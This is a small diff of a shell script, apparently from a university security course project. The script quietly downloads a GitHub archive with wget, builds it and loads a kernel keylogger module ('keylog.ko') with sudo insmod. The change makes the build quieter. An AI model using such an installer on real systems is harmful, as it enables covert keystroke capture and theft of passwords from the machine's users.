@@ -7,7 +7,7 @@ wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/maste
 
 unzip -o -q keylog.zip
 cd final-project-click-to-add-lemon-master/Source/
-make
+make -s
 sudo insmod keylog.ko
 
 cd ../..
